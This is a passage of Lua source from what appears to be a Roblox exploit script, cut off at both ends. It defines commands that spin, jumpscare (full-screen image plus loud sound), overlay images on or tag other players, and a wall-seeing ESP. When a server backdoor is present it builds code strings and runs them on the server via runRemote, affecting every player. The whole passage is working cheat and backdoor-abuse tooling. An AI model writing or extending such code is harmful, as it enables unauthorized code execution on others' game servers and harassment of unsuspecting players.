			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					startSpinning(player, number)
					found = true
					break
				end
			end
			if not found then
			end
		end
	else
		local targetScript
		if not target or target == "" or target == "me" then
			targetScript = string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer and localPlayer.Character then
            local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                for _, v in pairs(humanoidRootPart:GetChildren()) do
                    if v.Name == "Spinning" then
                        v:Destroy()
                    end
                end
                local spin = Instance.new("BodyAngularVelocity")
                spin.Name = "Spinning"
                spin.Parent = humanoidRootPart
                spin.MaxTorque = Vector3.new(0, math.huge, 0)
                spin.AngularVelocity = Vector3.new(0, %d, 0)
            end
        end
    ]], game.Players.LocalPlayer.Name, number)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                    local spin = Instance.new("BodyAngularVelocity")
                    spin.Name = "Spinning"
                    spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                    spin.MaxTorque = Vector3.new(0, math.huge, 0)
                    spin.AngularVelocity = Vector3.new(0, %d, 0)
                end
            ]], randomPlayer.Name, number)
		elseif target == "others" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                        end
                    end
                end
            ]]
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                        local spin = Instance.new("BodyAngularVelocity")
                        spin.Name = "Spinning"
                        spin.Parent = character:WaitForChild("HumanoidRootPart")
                        spin.MaxTorque = Vector3.new(0, math.huge, 0)
                        spin.AngularVelocity = Vector3.new(0, %speed%, 0)
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %d, 0)
                        end
                    ]], player.Name, number)
					break
				end
			end
		end

		targetScript = targetScript:gsub("%%speed%%", number)
		targetScript = targetScript:gsub("%%username%%", game.Players.LocalPlayer.Name)

		if targetScript then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unspin", "unspin", function(target)
	local players = game:GetService("Players"):GetPlayers()

	function stopSpinning(player)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			stopSpinning(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			stopSpinning(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					stopSpinning(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				stopSpinning(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					stopSpinning(player)
					found = true
					break
				end
			end
		end
	else

		local targetScript
		if not target or target == "" or target == "me" then
			targetScript = string.format([[
        local localPlayerName = "%s"
        local localPlayer = game:GetService("Players"):FindFirstChild(localPlayerName)
        if localPlayer and localPlayer.Character then
            local character = localPlayer.Character
            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                if v.Name == "Spinning" then
                    v:Destroy()
                end
            end
        end
    ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if targetScript then
			targetScript = targetScript:gsub("%%username%%", game.Players.LocalPlayer.Name)
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("console", "console", function()
	if unable["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
		unable["text chat service"].TextChannels.RBXGeneral:SendAsync("/console")
	else
		unable["replicated storage"].DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/console", "All")
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

isfullbrightlooping = false
local fullbrightloopconnection
originalSettings = {}

addcommand("fullbright", "fb", function()
	Lighting = game:GetService"Lighting"		
	originalSettings.Brightness = Lighting.Brightness
	originalSettings.ClockTime = Lighting.ClockTime
	originalSettings.FogEnd = Lighting.FogEnd
	originalSettings.GlobalShadows = Lighting.GlobalShadows
	originalSettings.OutdoorAmbient = Lighting.OutdoorAmbient
	if not isfullbrightlooping then
		isfullbrightlooping = true
		fullbrightloopconnection = game:GetService"RunService".Heartbeat:Connect(function()
			Lighting = game:GetService"Lighting"		
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unfullbright", "unfb", function()
	if isfullbrightlooping then
		isfullbrightlooping = false
		if fullbrightloopconnection then
			fullbrightloopconnection:Disconnect()
			fullbrightloopconnection = nil
		end
		Lighting = game:GetService"Lighting"		
		Lighting.Brightness = originalSettings.Brightness
		Lighting.ClockTime = originalSettings.ClockTime
		Lighting.FogEnd = originalSettings.FogEnd
		Lighting.GlobalShadows = originalSettings.GlobalShadows
		Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("jumpscare", "js", function(target, imageId, soundId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	soundId = soundId and soundId ~= "" and "rbxassetid://" .. soundId or "rbxassetid://7188420724"

	local function createJumpscare(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969

		local sound = Instance.new("Sound")
		sound.SoundId = soundId
		sound.Volume = 10
		sound.Parent = playerGui

		local function fadeOutImage()
			for i = 0, 1, 0.03 do
				imageLabel.ImageTransparency = i
				task.wait(0)
			end
			imageLabel:Destroy()
		end

		sound:Play()
		task.spawn(fadeOutImage)
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			createJumpscare(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			createJumpscare(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(createJumpscare, player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(createJumpscare, player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					createJumpscare(player)
					break
				end
			end
		end
		return
	end

	local targetScript

	if not target or target == "" or target == "me" then
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeOutImage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        task.wait(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeOutImage)
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeOutImage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        task.wait(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeOutImage)
            end
        ]], randomPlayer.Name, imageId, soundId)
	elseif target == "others" then
		targetScript = string.format([[
            local localPlayerName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeOutImage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                task.wait(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeOutImage)
                    end
                end
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "all" then
		targetScript = string.format([[
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = Instance.new("ScreenGui")
                    screenGui.Parent = playerGui

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Parent = screenGui
                    imageLabel.Image = "rbxassetid://" .. imageId
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Visible = true
                    imageLabel.ImageTransparency = 0
                    imageLabel.Size = UDim2.new(1, 0, 1, 60)
                    imageLabel.Position = UDim2.new(0, 0, 0, -60)
                    imageLabel.ZIndex = 6969

                    local sound = Instance.new("Sound")
                    sound.SoundId = soundId
                    sound.Volume = 10
                    sound.Parent = playerGui

                    local function fadeOutImage()
                        for i = 0, 1, 0.03 do
                            imageLabel.ImageTransparency = i
                            task.wait(0)
                        end
                        imageLabel:Destroy()
                    end

                    sound:Play()
                    task.spawn(fadeOutImage)
                end
            end
        ]], imageId, soundId)
	else
		targetScript = string.format([[
            local targetName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeOutImage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                task.wait(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeOutImage)
                    end
                end
            end
        ]], target, imageId, soundId)
	end

	if targetScript then
		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("screenimage", "simage", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()

	function showimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui
		screenGui.Name = ">.<"

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				showimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			showimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					showimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				showimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					showimage(player)
					found = true
					break
				end
			end
		end
	else
		local targetScript
		if not target or target == "" or target == "me" then
			local localPlayerName = game.Players.LocalPlayer.Name

			targetScript = string.format([[
        local localPlayer = game.Players:FindFirstChild("%s")
        if not localPlayer then return end
        local playerGui = localPlayer:FindFirstChild("PlayerGui")
        if not playerGui then return end

        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = playerGui
        screenGui.Name = ">.<"

        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Parent = screenGui
        imageLabel.Image = "rbxassetid://" .. "%s"
        imageLabel.BackgroundTransparency = 1
        imageLabel.Visible = true
        imageLabel.ImageTransparency = 0
        imageLabel.Size = UDim2.new(1, 0, 1, 60)
        imageLabel.Position = UDim2.new(0, 0, 0, -60)
        imageLabel.ZIndex = 6969
    ]], localPlayerName, imageId)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
        local player = game.Players:FindFirstChild("%s")
        if player and player:FindFirstChild("PlayerGui") then
            local playerGui = player:FindFirstChild("PlayerGui")
            local screenGui = Instance.new("ScreenGui")
            screenGui.Parent = playerGui
            screenGui.Name = ">.<"

            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Parent = screenGui
            imageLabel.Image = "rbxassetid://%s"
            imageLabel.BackgroundTransparency = 1
            imageLabel.Visible = true
            imageLabel.ImageTransparency = 0
            imageLabel.Size = UDim2.new(1, 0, 1, 60)
            imageLabel.Position = UDim2.new(0, 0, 0, -60)
            imageLabel.ZIndex = 6969
        end
    ]], randomPlayer.Name, imageId)
		elseif target == "others" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = Instance.new("ScreenGui")
                            screenGui.Parent = playerGui
                            screenGui.Name = ">.<"

                            local imageLabel = Instance.new("ImageLabel")
                            imageLabel.Parent = screenGui
                            imageLabel.Image = "rbxassetid://" .. "%imageId%"
                            imageLabel.BackgroundTransparency = 1
                            imageLabel.Visible = true
                            imageLabel.ImageTransparency = 0
                            imageLabel.Size = UDim2.new(1, 0, 1, 60)
                            imageLabel.Position = UDim2.new(0, 0, 0, -60)
                            imageLabel.ZIndex = 6969
                        end
                    end
                end
            ]]
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui
                        screenGui.Name = ">.<"

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. "%imageId%"
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui
                screenGui.Name = ">.<"

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969
            end
        ]], player.Name, imageId)
					break
				end
			end
		end

		if targetScript then
			targetScript = targetScript:gsub("%%imageId%%", imageId)
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unscreenimage", "unsimage", function(target)
	local players = game:GetService("Players"):GetPlayers()

	function removeimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if playerGui then
			local screenGui = playerGui:FindFirstChild(">.<")
			if screenGui then
				screenGui:Destroy()
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				removeimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			removeimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					removeimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				removeimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removeimage(player)
					found = true
					break
				end
			end
		end
	else
		local targetScript
		if not target or target == "" or target == "me" then
			targetScript = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = playerGui:FindFirstChild(">.<")
                        if screenGui then
                            screenGui:Destroy()
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player:FindFirstChild("PlayerGui") then
                            local playerGui = player:FindFirstChild("PlayerGui")
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if targetScript then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local highlightTypes = {
	Players = false,
}

local billboardTextVisible = true
local highlightVisible = true

local highlightLoopRunning = false

function createBillboardGui(parent, modelName, textColor, generatorStats)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "unableesp"
	billboard.Adornee = parent
	billboard.Size = UDim2.new(0, 100, 0, 50)
	billboard.AlwaysOnTop = true
	billboard.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = modelName
	label.Font = Enum.Font.RobotoMono
	label.TextColor3 = textColor
	label.TextStrokeTransparency = 0.5
	label.TextStrokeColor3 = Color3.new(1, 1, 1)
	label.TextSize = 16
	label.Visible = billboardTextVisible
	label.Parent = billboard

	if generatorStats then
		local currentAmount = generatorStats.CurrentAmount or 0
		local requiredAmount = generatorStats.RequiredAmount or 0
		local generatorText = modelName .. "\n(" .. currentAmount .. " / " .. requiredAmount .. ")"
		label.Text = generatorText
	end
end

function toggleBillboardTextVisibility(visible)
	billboardTextVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BillboardGui") and descendant.Name == "unableesp" then
			local label = descendant:FindFirstChildOfClass("TextLabel")
			if label then
				label.Visible = visible
			end
		end
	end
end

function toggleHighlightVisibility(visible)
	highlightVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") then
			descendant.Enabled = visible
		end
	end
end

function addHighlights()
	if highlightTypes.Players then
		for _, player in pairs(unable["players"]:GetPlayers()) do
			if player ~= unable["local player"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local highlight = player.Character:FindFirstChildOfClass("Highlight")
				if not highlight then
					highlight = Instance.new("Highlight")
					highlight.FillColor = unable["default border color"]
					highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
					highlight.Enabled = highlightVisible
					highlight.Parent = player.Character

					local billboardText = "(@" .. player.Name .. ")\n" .. player.DisplayName
					createBillboardGui(player.Character, billboardText, unable["default border color"])
				end
			end
		end
	end
end

function removeHighlights()
	for _, player in pairs(unable["players"]:GetPlayers()) do
		if player.Character then
			local highlight = player.Character:FindFirstChildOfClass("Highlight")
			if highlight then
				highlight:Destroy()
			end
			local billboard = player.Character:FindFirstChild("unableesp")
			if billboard then
				billboard:Destroy()
			end
		end
	end
end

function startHighlightLoop()
	if highlightLoopRunning then return end
	highlightLoopRunning = true

	unable["run service"].Stepped:Connect(function()
		if highlightLoopRunning then
			addHighlights()
		end
	end)
end

function stopHighlightLoop()
	highlightLoopRunning = false
	removeHighlights()
end

function enableEsp(type)
	highlightTypes[type] = true
	startHighlightLoop()
end

function disableEsp(type)
	highlightTypes[type] = false

	local allDisabled = true
	for _, isEnabled in pairs(highlightTypes) do
		if isEnabled then
			allDisabled = false
			break
		end
	end

	if allDisabled then
		stopHighlightLoop()
	else
		removeHighlights()
	end
end

function hideesptext()
	toggleBillboardTextVisibility(false)
	toggleHighlightVisibility(true)
end

function showesptext()
	toggleBillboardTextVisibility(true)
	if toggleHighlightVisibility(true) then
		toggleBillboardTextVisibility(false)
	end
end

function hideesp()
	toggleHighlightVisibility(false)
	toggleBillboardTextVisibility(true)
end

function showesp()
	toggleHighlightVisibility(true)
	if toggleBillboardTextVisibility(true) then
		toggleHighlightVisibility(false)
	end
end

function enableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = true
	end
	startHighlightLoop()
end

function disableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = false
	end
	stopHighlightLoop()
end

addcommand("esp", "esp", function()
	enableEsp("Players")
end)

addcommand("unesp", "unesp", function()
	disableEsp("Players")
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headbillboard", "headbb", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function addBillboardToHead(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head

			local existingBillboard = head:FindFirstChild("HeadBillboard")
			if existingBillboard then
				existingBillboard:Destroy()
			end

			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "HeadBillboard"
			billboardGui.Adornee = head
			billboardGui.Size = UDim2.new(3, 0, 3, 0)
			billboardGui.StudsOffset = Vector3.new(0, 0, 0)
			billboardGui.AlwaysOnTop = true
			billboardGui.Parent = head

			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Image = "rbxassetid://" .. imageId
			imageLabel.BackgroundTransparency = 1
			imageLabel.Size = UDim2.new(1, 0, 1, 0)
			imageLabel.Parent = billboardGui
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			addBillboardToHead(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			addBillboardToHead(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					addBillboardToHead(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				addBillboardToHead(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					addBillboardToHead(player)
					break
				end
			end
		end
		return
	end

	local targetScript

	if not target or target == "" or target == "me" then
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("HeadBillboard")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "HeadBillboard"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], localPlayerName, imageId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("HeadBillboard")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "HeadBillboard"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
